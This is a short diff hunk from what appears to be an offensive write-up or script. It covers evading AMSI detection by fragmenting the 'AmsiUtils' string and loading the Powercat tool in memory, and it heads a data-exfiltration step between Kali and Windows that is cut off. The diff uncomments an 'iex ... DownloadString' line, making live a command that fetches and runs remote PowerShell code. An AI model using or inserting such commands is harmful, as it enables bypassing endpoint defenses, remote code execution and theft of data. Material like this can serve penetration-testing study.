@@ -13,7 +13,7 @@ To evade detection, the `AmsiUtils` string was fragmented. This allows the scrip
 
 # Step 2: Loading Powercat
 # Once patched, Powercat was loaded in-memory:
-    # iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+     iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 
 # Step 3: Data Exfiltration (Kali & Windows):
     # On Kali Linux (Receiver):
